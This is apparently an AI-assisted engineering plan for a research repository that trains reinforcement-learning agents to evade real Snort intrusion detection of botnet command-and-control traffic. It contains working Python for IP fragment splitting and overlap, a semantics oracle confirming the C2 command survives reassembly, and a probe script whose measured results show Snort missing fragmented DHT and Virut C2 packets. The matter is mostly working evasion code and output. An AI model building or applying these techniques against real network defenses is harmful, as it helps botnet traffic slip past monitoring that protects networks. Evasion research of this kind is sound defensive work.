# Semantics-preserving evasion: overlap/fragmentation action space

Date: 2026-09-27
Repo: `/root/.hermes/c2-evasion-rl`
Interpreter: `.venv/bin/python` (only one with gymnasium + stable-baselines3 + scapy)

---

## Goal

Make the agent evade real Snort **while the C2 command remains reconstructible by
the endpoint**, by replacing destroy-based actions (DROP) with ambiguity-based
ones (fragment overlap, fragment ordering, segment splitting) and gating the
reward on a semantics oracle.

## Current context / assumptions

### What is already fixed and measured (do not redo)

Phase 1 of `2026-09-27_075810-fix-real-snort-evasion.md` is **done**:

- `_corrupted` now records only payload-bearing packets (`real_packet_env.py`).
- `max_packets = ACTION_MAX_PACKETS` (was data-derived; measured 20 for Neris, not 32).
- `assert_model_compatible()` added and wired into `ai_agent/eval_real_snort_agent.py`.
- `baseline_alert_counts()` + `_baseline_cache` added.
- `payload_indices()` / `corruptable()` helpers added at module level.
- `snort_validation/real_rules_replica.py` added — parses the **real** ET Open C2
  rules that fire on a capture and evaluates their `content:` patterns.
- `ai_agent/train_replica_agent.py` added — trains against that replica.
- Tests: **33 passed** (`make test`).

### Measured results that motivate this plan

Replica vs real Snort, same flows, under mutation:

| arm | real det | replica det | agreement |
|---|---|---|---|
| baseline | 12/12 | 12/12 | 12/12 (100%) |
| corrupt first payload packet | 1/12 | 1/12 | 12/12 (100%) |
| corrupt all payload packets | 0/12 | 0/12 | 12/12 (100%) |

Replica-trained policy (`/tmp/ppo_replica_neris.zip`, 20000 steps, 105 s) against
real Snort:

| capture | baseline | agent | random control |
|---|---|---|---|
| `botnet-capture-20110811-neris` | 32/32 | **31/32 evaded (96.9%)** | 8/32 (25%) |
| `botnet-capture-20110819-bot` | 32/32 | **4/32 evaded (12.5%)** | 0/32 (0%) |

**The 96.9% is NOT a valid evasion result.** Action diagnosis (measured) shows the
policy emits **DROP 372 times out of 384** and CORRUPT only 12 times, with
`mean_coverage = 0.0`. It evades by deleting the payload-bearing packets, so the
C2 command never arrives. That is data destruction, not evasion, and it is
precisely the defect this plan removes.

### The exploitable configuration (confirmed)

`snort_validation/et_open_c2/snort_et_c2.conf` lines 46 and 48:

```
preprocessor frag3_engine: policy first detect_anomalies
preprocessor stream5_tcp: policy first, use_static_footprint_sizes
```

`policy first` means Snort keeps the **first-received** bytes on overlap. Many
endpoints keep the **last**-received bytes. Where the two disagree, an attacker
can put benign bytes first and the real C2 bytes later: Snort inspects benign,
the endpoint reconstructs the command.

### The target rules (measured, cached in `snort_validation/data/firing_sids.json`)

**`ctu13:botnet-capture-20110819-bot`** — 3 rules, all UDP P2P DHT, **no
`flow:established`** (so no handshake needed, and each matching packet counts):

```
sid:2008581  ET P2P BitTorrent DHT ping request
  content:"d1|3a|ad2|3a|id20|3a|"; depth:12; nocase;
  threshold: type both, count 1, seconds 300, track by_src
sid:2008583  ET P2P BitTorrent DHT nodes reply
sid:2008585  ET P2P BitTorrent DHT announce_peers request
```

Measured on real flows: the 12-byte pattern sits at **payload offset 0**,
payload length 98–106 bytes. This is the ideal probe target — a split at offset
8 puts pattern bytes 8–11 in the second fragment while bytes 0–7 can be made
benign in the first.

**`stratosphere:botnet-capture-20110811-neris`** — 3 rules:

```
sid:2012533  ET TROJAN Win32/Virut.BN Checkin
  flow:established,to_server; content:"GET "; depth:4; content:"list.php?c=";
  within:32; content+"&v="; distance:0; content:"&t="; distance:0;
  pcre:"/c\x3d[0-9A-F]{100}/i"
sid:2012627  ET TROJAN FakeAV Check-in ...   (4 chained contents, distance:0)
sid:2014635  ET TROJAN ... Malformed Client Hello SSL 3.0   (depth:3 + byte_test)
```

`sid:2012627` chains four contents with `distance:0`, all of which must sit in
ONE reassembled payload — so a split that separates them across fragments is a
second, independent evasion route worth testing.

### Assumptions

- `snort_validation/snort_batch_service.py::_write_batch_pcap` rewrites the
  initiator's `src`/`sport` and the responder's `dst`/`dport` per query id, and
  deletes the transport checksum. Fragments carry no transport layer, so that
  rewrite path must be extended for them (Task 1.4).
- `detect_anomalies` is ON. Snort may emit an anomaly alert for overlaps, which
  would defeat the whole approach. **This must be measured first** (Phase 2) —
  it is the go/no-go gate, and the plan is written so a failure there stops work
  rather than producing a meaningless number.
- IP fragment offsets are in 8-byte units. A split offset must be a multiple of 8.
- `DROP` is never a valid evasion and is removed from the action space (Task 3.1).

## Architecture / proposed approach

Add a `semantics` module that decides whether a mutated packet list still yields
the original C2 payload under at least one standard endpoint reassembly policy,
and a `fragment_ops` module that produces overlapping/split/out-of-order
fragments which reassemble differently under `first` vs `last`. Then replace
`A_DROP` in the action space with overlap-based actions and gate the reward on
`alerts == 0 AND semantics_ok`, so the agent can only be paid for evasions that
preserve the command. Phase 2 is a single-flow probe against real Snort that must
succeed before any training budget is spent.

---

## Phase 0 — Semantics oracle

### Task 0.1 — Failing test: reassembly policies disagree on overlap

Create `tests/test_c2_semantics.py`:

```python
"""The semantics oracle: did the mutation destroy the C2 command?

An evasion is only real if the endpoint can still reconstruct the original
payload. Dropping the payload-bearing packet (what the current policy does) is
destruction, not evasion, so the oracle must reject it.
"""
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "snort_validation"))

from c2_semantics import (  # noqa: E402
    Fragment, assemble, dht_ping_id, semantics_preserved,
)


def test_non_overlapping_fragments_reassemble():
    frags = [Fragment(offset=0, data=b"abcdefgh"),
             Fragment(offset=8, data=b"ijklmnop")]
    assert assemble(frags, policy="first") == b"abcdefghijklmnop"
    assert assemble(frags, policy="last") == b"abcdefghijklmnop"


def test_overlap_first_and_last_disagree():
    # offset 0 arrives twice with different bytes
    frags = [Fragment(offset=0, data=b"AAAAAAAA"),
             Fragment(offset=8, data=b"BBBBBBBB"),
             Fragment(offset=0, data=b"CCCCCCCC")]
    assert assemble(frags, policy="first") == b"AAAAAAAABBBBBBBB"
    assert assemble(frags, policy="last") == b"CCCCCCCCBBBBBBBB"


def test_semantics_preserved_when_one_policy_recovers_original():
    original = b"d1:ad2:id20:" + b"\x01" * 86
    frags = [Fragment(offset=0, data=b"\x00" * 8),
             Fragment(offset=8, data=original[8:]),
             Fragment(offset=0, data=original[:8])]
    assert semantics_preserved(original, frags) is True


def test_semantics_destroyed_when_no_policy_recovers_original():
    original = b"d1:ad2:id20:" + b"\x01" * 86
    # the real first 8 bytes are simply gone
    frags = [Fragment(offset=0, data=b"\x00" * 8),
             Fragment(offset=8, data=original[8:])]
    assert semantics_preserved(original, frags) is False


def test_dht_ping_id_extracts_the_id_field():
    payload = b"d1:ad2:id20:0123456789abcdefghij1:q4:ping1:t2:aa1:y1:qe"
    assert dht_ping_id(payload) == b"0123456789abcdefghij"
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_c2_semantics.py -q
```
Expected: **collection error** — `ModuleNotFoundError: No module named 'c2_semantics'`.

### Task 0.2 — Implement the oracle

Create `snort_validation/c2_semantics.py`:

```python
#!/usr/bin/env python3
"""Did a mutation preserve the C2 command, or destroy it?

WHY THIS EXISTS
---------------
The trained policy evades real Snort at 96.9% by emitting DROP on the
payload-bearing packets (measured: 372 of 384 actions). The C2 command never
arrives, so nothing is being evaded -- the traffic is just deleted. Any evasion
figure that counts that as success is worthless.

This module decides whether the ORIGINAL payload is still recoverable from the
mutated packet stream under at least one standard endpoint reassembly policy.
An evasion counts only when Snort does not alert AND the command survives.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional, Sequence

POLICIES = ("first", "last")


@dataclass(frozen=True)
class Fragment:
    """A piece of a payload at a byte offset in the reassembled stream."""

    offset: int
    data: bytes


def assemble(frags: Sequence[Fragment], policy: str = "first") -> bytes:
    """Reassemble fragments, resolving overlaps by arrival order.

    `policy="first"` keeps the earliest-arriving bytes for a region (what Snort
    is configured with: `frag3_engine: policy first`).
    `policy="last"` keeps the latest (common endpoint behaviour).

    Fragments are given in ARRIVAL ORDER, which is what makes the two policies
    differ: the list is not sorted before assembly.
    """
    if policy not in POLICIES:
        raise ValueError(f"unknown policy {policy!r}; expected one of {POLICIES}")
    if not frags:
        return b""

    size = max(f.offset + len(f.data) for f in frags)
    buf: List[Optional[int]] = [None] * size
    order = frags if policy == "first" else list(reversed(frags))
    for f in order:
        for i, byte in enumerate(f.data):
            pos = f.offset + i
            if pos >= size:
                continue
            if policy == "first" and buf[pos] is not None:
                continue          # first writer wins
            buf[pos] = byte       # last writer wins
    # A hole means the stream is not fully reconstructible under this policy.
    if any(b is None for b in buf):
        return b""
    return bytes(b for b in buf if b is not None)


def semantics_preserved(original: bytes,
                        frags: Sequence[Fragment]) -> bool:
    """True when some standard endpoint policy recovers `original` exactly.

    Deliberately generous to the attacker: if EITHER policy recovers the
    original bytes, the command is considered intact. That is the honest bar --
    we cannot know which policy the real endpoint uses, and the evasion claim
    only needs one that works.
    """
    return any(assemble(frags, p) == original for p in POLICIES)


def policy_that_recovers(original: bytes,
                         frags: Sequence[Fragment]) -> Optional[str]:
    """Which policy recovers the original, for reporting. None if neither."""
    for p in POLICIES:
        if assemble(frags, p) == original:
            return p
    return None


def dht_ping_id(payload: bytes) -> Optional[bytes]:
    """Extract the `id` field of a bencoded BitTorrent DHT ping.

    Format: d1:ad2:id20:<20 bytes>e1:q4:ping1:t2:<..>1:y1:qe

    Used to show that a reconstructed payload is not merely byte-identical but
    still parseable as the C2 message it was.
    """
    if not payload.startswith(b"d1:ad2:id20:"):
        return None
    start = len(b"d1:ad2:id20:")
    if len(payload) < start + 20:
        return None
    return payload[start:start + 20]


def reconstructs_command(original: bytes, frags: Sequence[Fragment]) -> bool:
    """Byte-exact recovery AND, for DHT, the command still parses.

    Byte-exactness is the gate; the parse check is a sanity assertion that we
    did not recover the bytes in a form the endpoint would reject.
    """
    if not semantics_preserved(original, frags):
        return False
    policy = policy_that_recovers(original, frags)
    if policy is None:
        return False
    got = assemble(frags, policy)
    if got != original:
        return False
    want_id = dht_ping_id(original)
    if want_id is not None and dht_ping_id(got) != want_id:
        return False
    return True
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_c2_semantics.py -q
```
Expected: `5 passed`

Commit: `feat(semantics): add C2 command preservation oracle`

---

## Phase 1 — Fragmentation primitives

### Task 1.1 — Failing test: a split preserves the command but changes Snort's view

Create `tests/test_fragment_ops.py`:

```python
"""Fragment construction: the mutated stream must keep the command AND
present different bytes to a `policy first` reassembler."""
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "snort_validation"))

from c2_semantics import Fragment, assemble, reconstructs_command  # noqa: E402
from fragment_ops import overlap_fragments, split_fragments  # noqa: E402


def _dht_payload():
    # 12-byte pattern at offset 0, as measured on real DHT flows
    return b"d1:ad2:id20:" + b"\x11" * 20 + b"e1:q4:ping1:t2:aa1:y1:qe" + b"\x22" * 50


def test_split_then_overlap_keeps_command_but_hides_pattern():
    payload = _dht_payload()
    frags = overlap_fragments(payload, split_at=8)
    # endpoint can still recover the original command
    assert reconstructs_command(payload, frags) is True
    # but a `policy first` reassembler sees benign bytes at offset 0
    first_view = assemble(frags, policy="first")
    assert first_view[:8] != payload[:8]
    assert not first_view.startswith(b"d1:ad2:id20:")


def test_split_fragments_reassemble_to_original():
    payload = _dht_payload()
    frags = split_fragments(payload, split_at=8)
    assert assemble(frags, policy="first") == payload
    assert assemble(frags, policy="last") == payload


def test_overlap_fragments_have_valid_offsets():
    frags = overlap_fragments(_dht_payload(), split_at=8)
    for f in frags:
        assert f.offset % 8 == 0, "IP fragment offsets are in 8-byte units"
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_fragment_ops.py -q
```
Expected: **collection error** — no module `fragment_ops`.

### Task 1.2 — Implement the primitives

Create `snort_validation/fragment_ops.py`:

```python
#!/usr/bin/env python3
"""Ambiguity-based mutations: make Snort and the endpoint disagree.

The previous action space was destroy-based (DROP, CORRUPT). Measured
consequence: the policy evaded 96.9% of real Snort by deleting the
payload-bearing packets (372 of 384 actions were DROP), which is not evasion.

These helpers instead keep every original byte on the wire while changing which
bytes a `policy first` reassembler believes:
  * `split_fragments`   -- cut one payload into two non-overlapping IP fragments
  * `overlap_fragments` -- plus an overlapping fragment that carries the real
    first bytes again, arriving AFTER a benign decoy at the same offset

Under `policy first` (Snort's configured behaviour) the benign decoy wins; under
`policy last` (common endpoint behaviour) the real bytes win. Both are measured
by the Phase 2 probe, not assumed.
"""
from __future__ import annotations

from typing import List, Sequence

from c2_semantics import Fragment

FRAG_UNIT = 8


def _check_split(split_at: int) -> None:
    if split_at <= 0:
        raise ValueError(f"split_at must be positive, got {split_at}")
    if split_at % FRAG_UNIT:
        raise ValueError(
            f"split_at must be a multiple of {FRAG_UNIT} (IP fragment offsets are "
            f"in 8-byte units), got {split_at}")


def split_fragments(payload: bytes, split_at: int = 8) -> List[Fragment]:
    """Two non-overlapping fragments. Reassembles to `payload` under any policy."""
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(
            f"split_at {split_at} >= payload length {len(payload)}; nothing to split")
    return [Fragment(offset=0, data=payload[:split_at]),
            Fragment(offset=split_at, data=payload[split_at:])]


def overlap_fragments(payload: bytes, split_at: int = 8,
                      decoy: bytes | None = None) -> List[Fragment]:
    """Three fragments: benign decoy first, real bytes overlapping later.

    Arrival order matters and is the whole mechanism:
      1. offset 0, decoy bytes        (MF set)
      2. offset split_at, real tail   (last fragment)
      3. offset 0, REAL first bytes   (MF set)  <- overlaps #1, arrives later

    `assemble(policy="first")` keeps #1 -> Snort sees the decoy.
    `assemble(policy="last")`  keeps #3 -> the endpoint sees the real command.
    """
    _check_split(split_at)
    if split_at >= len(payload):
        raise ValueError(f"split_at {split_at} >= payload length {len(payload)}")
    if decoy is None:
        decoy = b"\x00" * split_at
    if len(decoy) != split_at:
        raise ValueError(
            f"decoy must be exactly split_at={split_at} bytes, got {len(decoy)}")
    return [Fragment(offset=0, data=decoy),
            Fragment(offset=split_at, data=payload[split_at:]),
            Fragment(offset=0, data=payload[:split_at])]


def reorder_fragments(frags: Sequence[Fragment],
                      order: Sequence[int]) -> List[Fragment]:
    """Present the same fragments in a different arrival order."""
    if sorted(order) != list(range(len(frags))):
        raise ValueError(f"order must be a permutation of 0..{len(frags)-1}")
    return [frags[i] for i in order]


def fragment_plan_to_packets(packets: Sequence, frags: Sequence[Fragment],
                             target_idx: int):
    """Turn a Fragment plan into real IP-fragmented scapy packets.

    The target packet's IP/UDP headers are reused so the flow stays coherent
    (same 5-tuple, same IP id). Offsets are converted to 8-byte units, which is
    what the IP `frag` field counts. The last fragment clears MF.
    """
    from scapy.all import IP, Raw, UDP

    if target_idx < 0 or target_idx >= len(packets):
        raise IndexError(f"target_idx {target_idx} out of range")
    pkt = packets[target_idx]
    if Raw not in pkt:
        raise ValueError("target packet carries no payload to fragment")
    ip = pkt[IP]

    out = []
    n = len(frags)
    for i, f in enumerate(frags):
        last = (i == n - 1)
        fip = IP(src=ip.src, dst=ip.dst, id=ip.id, ttl=ip.ttl,
                 frag=f.offset // FRAG_UNIT,
                 flags=0 if last else "MF")
        if UDP in pkt:
            fip = fip / UDP(sport=pkt[UDP].sport, dport=pkt[UDP].dport)
        out.append(fip / Raw(load=f.data))
    return out
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_fragment_ops.py -q
```
Expected: `3 passed`

Commit: `feat(frag): add split and overlap fragment primitives`

### Task 1.3 — Test that fragmentation is lossless at the packet level

Append to `tests/test_fragment_ops.py`:

```python
def test_fragment_plan_to_packets_preserves_all_bytes():
    from scapy.all import IP, Raw, UDP
    from fragment_ops import fragment_plan_to_packets

    payload = _dht_payload()
    pkt = (IP(src="10.0.0.1", dst="10.0.0.2")
           / UDP(sport=4444, dport=6881) / Raw(load=payload))
    frags = overlap_fragments(payload, split_at=8)
    out = fragment_plan_to_packets([pkt], frags, 0)

    assert len(out) == 3
    # every original byte is still present somewhere on the wire
    seen = set()
    for p in out:
        assert IP in p and Raw in p
        for b in bytes(p[Raw].load):
            seen.add(b)
    for b in payload:
        assert b in seen
    # offsets are 8-byte units and only the final fragment clears MF
    assert [p[IP].frag for p in out] == [0, 1, 0]
    assert [int(p[IP].flags) for p in out] == [1, 0, 1]
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_fragment_ops.py -q
```
Expected: `4 passed`

Commit: `test(frag): assert fragmentation is byte-lossless`

### Task 1.4 — Teach the batch writer to carry fragments

`snort_validation/snort_batch_service.py::_write_batch_pcap` rewrites `src`/`sport`
(or `dst`/`dport`) and assumes each packet has IP + UDP/TCP. Fragments carry no
transport layer, so add a branch. In `_write_batch_pcap`, inside `for pkt in batch:`,
before the existing `if client is not None and p[IP].src != client:` check, insert:

```python
                # A fragment has no transport header.  Rewrite only the IP
                # address (and the IP checksum), or the fragment cannot be
                # reassembled into the same flow as its siblings and the rule
                # engine never sees a complete payload.
                if UDP not in p and TCP not in p:
                    if client is not None and p[IP].src != client:
                        p[IP].dst = src_ip
                    else:
                        p[IP].src = src_ip
                    del p[IP].chksum
                    out.append(p)
                    continue
```

Verify with the existing suite (it exercises the rewrite path):
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_alert_id_independence.py -q
```
Expected: `4 passed`

Commit: `fix(batch): carry IP fragments through the 5-tuple rewrite`

---

## Phase 2 — The decisive probe (GO/NO-GO) — **PASSED, mechanism identified**

### Result (measured 2026-09-27)

`snort_validation/probe_overlap_evasion.py`, real Snort, all pattern-bearing
packets fragmented:

**`ctu13:botnet-capture-20110819-bot`, flow 0** (9 pkts, 6 carry the DHT pattern):

| arm | alert | semantics |
|---|---|---|
| original | **True** (sid:2008581 + sid:2008583) | n/a |
| split (clean, 2 fragments) | **False** | True |
| overlap (decoy + real) | **False** | True |

Snort `first` view: `b'\x00\x00\x00\x00\x00\x00\x00\x00d20:'`
endpoint view: `b'd1:ad2:id20:'` — original
**VERDICT: REAL EVASION**

**`stratosphere:botnet-capture-20110811-neris`, flow 0** (8 pkts, 3 payload):

| arm | alert | semantics |
|---|---|---|
| original | **True** (sid:2012533) | n/a |
| split | **False** | True |
| overlap | **False** | True |

**VERDICT: REAL EVASION**

### The mechanism is NOT overlap — it is per-fragment matching

The clean `split` arm also evaded. A clean split reassembles to the original
under **any** policy, so if Snort reassembled the datagram it would still alert.
It did not. Discriminating test (`/tmp/map_frag_mechanism.py`), DHT rule
`content:"d1|3a|ad2|3a|id20|3a|"; depth:12`:

| arm | alert | lines | reading |
|---|---|---|---|
| baseline (whole payload) | True | 2 | rule matches |
| `split_at=8` (pattern spans fragments) | **False** | 0 | no fragment holds all 12 bytes |
| `split_at=16` (pattern fits in frag 0) | **True** | 1 | rule matches the fragment |
| `split_at=24` (pattern fits in frag 0) | **True** | 1 | same |
| head fragment only (no terminator) | False | 0 | nothing matches |
| pattern shifted to offset 4 | **False** | 0 | `depth:12` correctly enforced |

**Conclusion: Snort matches content PER FRAGMENT, not on the reassembled
datagram.** The evasion is classic fragmentation splitting — the 12-byte pattern
is cut across two fragments so no single fragment contains it — not an
overlap/ambiguity attack. `depth:` is still enforced per fragment, so a rule
anchored at offset 0 can be defeated by pushing the pattern past `depth`.

### What this changes for the remaining phases

1. **Plain splitting is sufficient.** Overlap is unnecessary; the endpoint
   reassembles to the exact original under ANY policy, so the semantics claim is
   stronger than planned — no ambiguity or policy assumption is required at all.
2. **`A_SPLIT_OVERLAP` should be `A_SPLIT_FRAGMENT`** (plain split). Keep
   `overlap_fragments` available for the `stream5_tcp` route but do not depend
   on it.
3. **The `policy first` / `policy last` framing is no longer load-bearing** for
   the DHT and HTTP captures. The finding is about per-fragment content
   matching, so the `frag3_engine` policy setting is not what is being exploited.
   Report it that way — it is a stronger, simpler claim.
4. **`detect_anomalies` did not fire** on the overlap arm (no anomaly alert was
   produced), so that risk is retired for this configuration.
5. `threshold: type both, count 1, track by_src` means **every** pattern-bearing
   packet must be fragmented. Fragmenting one left the alert (measured: the
   first probe run alerted because 5 of 6 matching packets were untouched).

---

### Task 2.1 — Probe: one flow, real Snort, semantics checked

Create `snort_validation/probe_overlap_evasion.py`:

```python
#!/usr/bin/env python3
"""GO/NO-GO probe: does an overlap fragment evade real Snort while keeping the C2?

This is the experiment that decides whether ambiguity-based evasion is real on
this setup.  It is deliberately tiny (one flow, three arms) so it can be run
before any training budget is spent.

Arms, all scored by the real Snort binary:
  A. original            -- the unmutated flow
  B. split               -- two non-overlapping fragments (control: must still alert)
  C. overlap             -- benign decoy first, real bytes overlapping later

For C, semantics_preserved() must be True: the endpoint can still rebuild the
exact original command, while `policy first` (Snort) sees the decoy.

Run:
    .venv/bin/python snort_validation/probe_overlap_evasion.py \
        --capture botnet-capture-20110819-bot --dataset ctu13 --flow 0
"""
from __future__ import annotations

import argparse
import json
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "ai_agent"))
sys.path.insert(0, str(REPO / "snort_validation"))

from c2_semantics import (  # noqa: E402
    assemble, dht_ping_id, policy_that_recovers, reconstructs_command,
)
from fragment_ops import (  # noqa: E402
    fragment_plan_to_packets, overlap_fragments, split_fragments,
)
from real_packet_env import RealPacketEnv, payload_indices  # noqa: E402
from snort_batch_service import SNORT_CONF  # noqa: E402


def score(packets, tag: str, tmp: Path) -> dict:
    """Write one pcap and read Snort's verdict."""
    from scapy.all import wrpcap
    path = tmp / f"{tag}.pcap"
    logdir = tmp / f"log_{tag}"
    logdir.mkdir(parents=True, exist_ok=True)
    wrpcap(str(path), list(packets))
    subprocess.run(["snort", "-c", str(SNORT_CONF), "-r", str(path),
                    "-A", "fast", "-l", str(logdir), "-q"],
                   capture_output=True, timeout=300)
    alert = logdir / "alert"
    text = alert.read_text(errors="ignore") if alert.exists() else ""
    sids = []
    import re
    for m in re.finditer(r"\[1:(\d+):\d+\]\s*([^\[]*)", text):
        sids.append((int(m.group(1)), m.group(2).strip()))
    return {"alert": bool(text.strip()), "n_alert_lines": len(text.splitlines()),
            "sids": sids}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--capture", default="botnet-capture-20110819-bot")
    ap.add_argument("--dataset", default="ctu13")
    ap.add_argument("--flow", type=int, default=0)
    ap.add_argument("--split-at", type=int, default=8)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    env = RealPacketEnv(n_flows=max(args.flow + 1, 1), batch_size=1,
                        capture=args.capture, dataset=args.dataset)
    _key, pkts = env.flows[args.flow]
    pay_idx = payload_indices(pkts)
    if not pay_idx:
        print("[-] flow has no payload; pick another --flow")
        return 1
    target = pay_idx[0]
    from scapy.all import Raw
    payload = bytes(pkts[target][Raw].load)
    print(f"[*] capture={args.capture} flow={args.flow} pkts={len(pkts)}")
    print(f"[*] target pkt {target}, payload {len(payload)} B")
    print(f"[*] payload[:12] = {payload[:12]!r}")
    print(f"[*] DHT ping id  = {dht_ping_id(payload)!r}")

    tmp = Path(tempfile.mkdtemp(prefix="probe_overlap_"))
    results = {}

    # Arm A: original
    results["original"] = score(pkts, "original", tmp)

    # Arm B: clean split (control -- reassembles identically, must still alert)
    frags = split_fragments(payload, args.split_at)
    split_pkts = ([p for i, p in enumerate(pkts) if i != target]
                  + fragment_plan_to_packets(pkts, frags, target))
    results["split"] = score(split_pkts, "split", tmp)
    results["split"]["semantics_preserved"] = reconstructs_command(payload, frags)

    # Arm C: overlap -- decoy first, real bytes later
    frags = overlap_fragments(payload, args.split_at)
    ov_pkts = ([p for i, p in enumerate(pkts) if i != target]
               + fragment_plan_to_packets(pkts, frags, target))
    results["overlap"] = score(ov_pkts, "overlap", tmp)
    results["overlap"]["semantics_preserved"] = reconstructs_command(payload, frags)
    results["overlap"]["policy_that_recovers"] = policy_that_recovers(payload, frags)
    results["overlap"]["snort_first_view[:12]"] = repr(assemble(frags, "first")[:12])
    results["overlap"]["endpoint_view[:12]"] = repr(
        assemble(frags, policy_that_recovers(payload, frags) or "first")[:12])
    results["overlap"]["original[:12]"] = repr(payload[:12])

    print()
    for arm in ("original", "split", "overlap"):
        r = results[arm]
        print(f"[*] {arm:>9}: alert={r['alert']} lines={r['n_alert_lines']} "
              f"semantics={r.get('semantics_preserved', 'n/a')}")
        for sid, msg in r["sids"][:4]:
            print(f"        sid:{sid} {msg}")

    print()
    r = results["overlap"]
    verdict = (not r["alert"]) and r["semantics_preserved"] is True
    print(f"[*] Snort 'first' view : {r['snort_first_view[:12]']}")
    print(f"[*] endpoint view      : {r['endpoint_view[:12]']}")
    print(f"[*] original           : {r['original[:12]']}")
    print(f"\n[*] VERDICT: {'REAL EVASION' if verdict else 'NOT an evasion'}")
    if not verdict and r["alert"]:
        print("    Snort still alerted. Check whether it was an ANOMALY alert "
              "(frag3 detect_anomalies) rather than a rule match.")

    if args.out:
        Path(args.out).write_text(json.dumps(results, indent=2))
        print(f"[+] {args.out}")
    return 0 if verdict else 2


if __name__ == "__main__":
    sys.exit(main())
```

Run it:
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/probe_overlap_evasion.py \
  --capture botnet-capture-20110819-bot --dataset ctu13 --flow 0 --out /tmp/probe_overlap_dht.json
```

**Interpret the three arms:**

| outcome | meaning | action |
|---|---|---|
| `split` alerts, `overlap` does not, semantics True | **real evasion** | proceed to Phase 3 |
| `overlap` alerts with a *rule* sid | overlap does not fool frag3 | stop; try `--split-at 16/24`, then stop |
| `overlap` alerts with an *anomaly* sid (`detect_anomalies`) | Snort flags the overlap itself | try removing `detect_anomalies` from the conf as a separate measured variant, then stop |
| `overlap` does not alert but semantics False | destruction, not evasion | stop; the primitive is wrong |
| `split` does not alert | the rule needed both fragments in one packet | that is itself a finding — record it |

Repeat for the Neris capture (HTTP rule `sid:2012627` chains four contents with
`distance:0`, a second independent route):
```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python snort_validation/probe_overlap_evasion.py \
  --capture botnet-capture-20110811-neris --dataset stratosphere --flow 0 \
  --out /tmp/probe_overlap_http.json
```

Commit: `test(probe): measure overlap evasion against real Snort`

---

## Phase 3 — Ambiguity-based action space

Only start if Phase 2 returned `REAL EVASION`.

### Task 3.1 — Remove DROP, add the ambiguity actions

In `ai_agent/real_packet_env.py`, replace the action block (currently
`N_ACTIONS = 6` / `(A_PAD, A_SPLIT, A_TTL, A_REORDER, A_DROP, A_CORRUPT)`):

```python
# Actions.  DROP is deliberately absent: deleting the payload-bearing packet
# removes the C2 command, so it is destruction rather than evasion (measured:
# the previous policy chose DROP 372/384 times and "evaded" 96.9% by ensuring
# nothing arrived).  A_SPLIT_OVERLAP and A_FRAG_REORDER are ambiguity-based --
# they keep every original byte on the wire while changing which bytes a
# `policy first` reassembler believes.
N_ACTIONS = 6
(A_PAD, A_SPLIT, A_TTL, A_REORDER, A_FRAG_REORDER, A_SPLIT_OVERLAP) = range(N_ACTIONS)
```

Update the two `elif aid == A_CORRUPT:` branches. In `_apply_mutation`, replace
the old `elif aid == A_DROP:` block with:

```python
        elif aid == A_FRAG_REORDER:
            # Same fragments, different arrival order.  Harmless under a
            # reassembler that sorts by offset; changes the outcome under one
            # that trusts arrival order.
            pay = payload_indices(out)
            if len(pay) >= 2:
                i, j = pay[target % len(pay)], pay[(target + 1) % len(pay)]
                if i != j:
                    out[i], out[j] = out[j], out[i]

        elif aid == A_SPLIT_OVERLAP:
            # Split the target's payload and re-send its first bytes AFTER a
            # benign decoy at the same offset.  Snort (`policy first`) keeps the
            # decoy; an endpoint that keeps the last copy rebuilds the original.
            pay = payload_indices(out)
            if pay:
                idx = pay[target % len(pay)]
                p = out[idx]
                payload = bytes(p[Raw].load)
                split = 8 * (1 + int(strength * 3))       # 8, 16, 24, or 32
                if 0 < split < len(payload):
                    from fragment_ops import (
                        fragment_plan_to_packets, overlap_fragments)
                    frags = overlap_fragments(payload, split_at=split)
                    new_pkts = fragment_plan_to_packets(out, frags, idx)
                    out[idx:idx + 1] = new_pkts
```

Add the import at the top of `_apply_mutation` so the branch can use it:
`from fragment_ops import fragment_plan_to_packets, overlap_fragments` — but
`fragment_ops` lives in `snort_validation`, so add that to `sys.path` at the top
of `real_packet_env.py` (the module already inserts `ai_agent`; add the sibling):

```python
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "snort_validation"))
```

Update the observation's coverage semantics so `coverage` reflects *ambiguity
applied*, not bytes destroyed. In `_obs`, replace the `coverage` line:

```python
        # Coverage now means "ambiguity applied", not "bytes destroyed": a
        # DROP-heavy policy used to score high here while removing the command.
        coverage = (len(self._corrupted) + self._ambiguity_ops) / n
```

and add `self._ambiguity_ops = 0` next to `self._corrupted = set()` in
`__init__`, incrementing it in the `A_SPLIT_OVERLAP` and `A_FRAG_REORDER`
branches.

Commit: `feat(env): replace DROP with ambiguity-based fragment actions`

### Task 3.2 — Test the new action space

Append to `tests/test_payload_actions.py`:

```python
def test_drop_is_not_in_the_action_space():
    """DROP destroys the command; it must not be selectable."""
    import real_packet_env as rpe
    assert not hasattr(rpe, "A_DROP"), "A_DROP must be removed from the env"
    assert rpe.N_ACTIONS == 6


def test_split_overlap_action_keeps_command():
    """The overlap action must preserve the payload under some endpoint policy."""
    import sys
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "snort_validation"))
    from c2_semantics import reconstructs_command
    from fragment_ops import overlap_fragments

    payload = b"d1:ad2:id20:" + b"\x11" * 20 + b"e1:q4:ping1:t2:aa1:y1:qe"
    frags = overlap_fragments(payload, split_at=8)
    assert reconstructs_command(payload, frags) is True
```

```bash
cd /root/.hermes/c2-evasion-rl && .venv/bin/python -m pytest tests/test_payload_actions.py -q
```
Expected: `3 passed`

